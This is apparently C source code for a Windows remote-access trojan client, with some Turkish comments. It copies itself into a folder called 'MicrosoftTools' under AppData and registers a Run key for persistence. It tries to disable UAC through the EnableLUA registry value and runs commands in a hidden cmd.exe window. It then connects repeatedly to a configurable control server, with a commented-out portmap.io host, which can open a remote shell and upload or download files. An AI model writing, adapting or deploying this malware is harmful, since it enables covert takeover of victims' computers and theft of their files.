#include <stdio.h>
#include <windows.h>
#include <Lmcons.h>
#include "EA_Socket.h"
#include "process.h"

int port = 5005;//54977;
char host[] = "127.0.0.1";//fbf-54977.portmap.io";
char lastFolderName[60] = "MicrosoftTools";

static void defect(void);
static void lifeOnSystem(void);
static void onlyRunCommand(char * cmd);
static void readHostAndPortFromFile(void);
static int process(int sckt, char * al);

int main()	// gcc --machine-windows
{
	WSADATA _wsdata;

	while (WSAStartup(MAKEWORD(2, 0), &_wsdata) != 0)
	{
		Sleep(500);
	}

	//setlocale(LC_ALL, "Turkish");

	//TODO: ByPass UAC

	defect();

	lifeOnSystem();
	
	WSACleanup();

	return 0;
}

static void defect(void)
{
	// Get username
	char username[UNLEN+1] = {0};
	DWORD len = sizeof(username);
	GetUserNameA(username, &len);

	// Get path and program name
	char * progName;
	char srcPathwithName[MAX_PATH + 1] = {0};
	GetModuleFileNameA(NULL, srcPathwithName, MAX_PATH);
	size_t i = strlen(srcPathwithName);
	while(srcPathwithName[i - 1] != '\\') i--;
	progName = srcPathwithName + i;

	// Create target path
	char targetPath[MAX_PATH + 1] = {0};

	strcpy(targetPath, "C:\\Users\\");
	strcat(targetPath, username);
	strcat(targetPath, "\\AppData\\Local\\");
	strcat(targetPath, lastFolderName);

	DWORD dwAttr = GetFileAttributesA(targetPath);

	if (dwAttr != 0xffffffff && (dwAttr & FILE_ATTRIBUTE_DIRECTORY))
	{
		int len = strlen(lastFolderName);

		if (i < len || strncmp(srcPathwithName + i - 1 - len, lastFolderName, len) != 0)
		{
			exit(0);
		}
		return;
	}

	char command[400] = {0};

	strcpy(command, "/c mkdir ");
	strcat(command, targetPath);
	onlyRunCommand(command);

	ZeroMemory(command, 400);
	strcpy(command, "/c copy ");
	strcat(command, srcPathwithName);
	strcat(command, " ");
	strcat(command, targetPath);
	strcat(command, "\\");
	strcat(command, progName);
	onlyRunCommand(command);

	ZeroMemory(command, 400);
	strcpy(command, targetPath);
	strcat(command, "\\");
	strcat(command, progName);

	HKEY hKey;
	char * czStartName = progName;
	char * czExePath   = command;

	LONG lnRes = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);

	if(ERROR_SUCCESS == lnRes)
	{
		lnRes = RegSetValueExA(hKey, czStartName, 0, REG_SZ, (BYTE * )czExePath, strlen(czExePath));
	}

	RegCloseKey(hKey);

	DWORD number = 0;
	lnRes = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_WRITE, &hKey);
	// if the program is started without admin, lnRes will not be ERROR_SUCCESS.
	if(ERROR_SUCCESS == lnRes)
	{
		lnRes = RegSetValueExA(hKey, "EnableLUA", 0, REG_DWORD, (BYTE * )&number, sizeof(DWORD));
	}

	RegCloseKey(hKey);

	ZeroMemory(command, 400);
	strcpy(command, "/c start ");
	strcat(command, targetPath);
	strcat(command, "\\");
	strcat(command, progName);
	onlyRunCommand(command);

	exit(0);
}

static void lifeOnSystem(void)
{
	char * al;
	int sckt;
    struct hostent * he;
	int de, check = 0, yes = 1;
	struct sockaddr_in veriler;
    struct in_addr ** addr_list;

    readHostAndPortFromFile();

	while((he = gethostbyname(host)) == NULL)
	{
		Sleep(1000);
	}

	addr_list = (struct in_addr **)he->h_addr_list;

	while (1)
	{
		sckt = socket(AF_INET, SOCK_STREAM, 0);

		if (sckt != SOCKET_ERROR)
		{
			setsockopt(sckt, SOL_SOCKET, SO_REUSEADDR, (char * )&yes, sizeof(int));

			veriler.sin_family = AF_INET;
			veriler.sin_port = htons(port);
			veriler.sin_addr.s_addr = inet_addr(inet_ntoa(*addr_list[0]));
			memset(veriler.sin_zero, 0, 8);

			while (1)
			{
				if((check = connect(sckt, (struct  sockaddr *)&veriler, sizeof(veriler))) != SOCKET_ERROR)
				{
					break;
				}

				Sleep(500);
			}

			while(1)
			{
				if ((al = recverText(sckt)) == NULL)
				{
					break;
				}

				if ((de = process(sckt, al)) != 0)
				{
					break;
				}

				free(al);
			}

			closesocket(sckt);
		}

		Sleep(1000);
	}
}

static void onlyRunCommand(char * cmd)
{
	BOOL bSuccess = FALSE;
	STARTUPINFO siStartInfo;
	PROCESS_INFORMATION piProcInfo;

	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

	siStartInfo.cb = sizeof(STARTUPINFO);

	bSuccess = CreateProcessA(TEXT("C:\\Windows\\System32\\cmd.exe"), cmd,
		NULL, NULL, TRUE,
		CREATE_NO_WINDOW, // CREATE_NO_WINDOW CREATE_NEW_CONSOLE
		NULL, NULL, &siStartInfo, &piProcInfo
	);

	if (!bSuccess)
	{
		return;
	}
	else
	{
		CloseHandle(piProcInfo.hProcess);
		CloseHandle(piProcInfo.hThread);
	}

	Sleep(500); //TODO: process tam açýlana kadar beklenmeli
}

static void readHostAndPortFromFile(void)
{
	FILE * fIpPort;

	fIpPort = fopen("dt", "r");

	if (fIpPort != NULL)
	{
		fscanf(fIpPort,"%s %d", host, &port);
		fclose(fIpPort);
	}
}

static int process(int sckt, char * al)
{
	if (strcmp(al, "cmd") == 0)
	{
		processCMD(sckt);
	}
	else if (strncmp(al, "getFile ", 8) == 0)
	{
		processFileUpload(sckt, al + 8);
	}
	else if (strncmp(al, "sendFile ", 9) == 0)
	{
		processFileDownload(sckt, al + 9);
	}
	else if (strcmp(al, "update") == 0)
	{
		// TODO: processUpdate(sckt);
	}
	else if (strncmp(al, "hostsil ", 8) == 0)
	{
		// TODO: remove public ip from exe
	}
	else if (strncmp(al, "host port ", 10) == 0)
	{
		processIpPort(al + 10);
	}

	return 0;
}
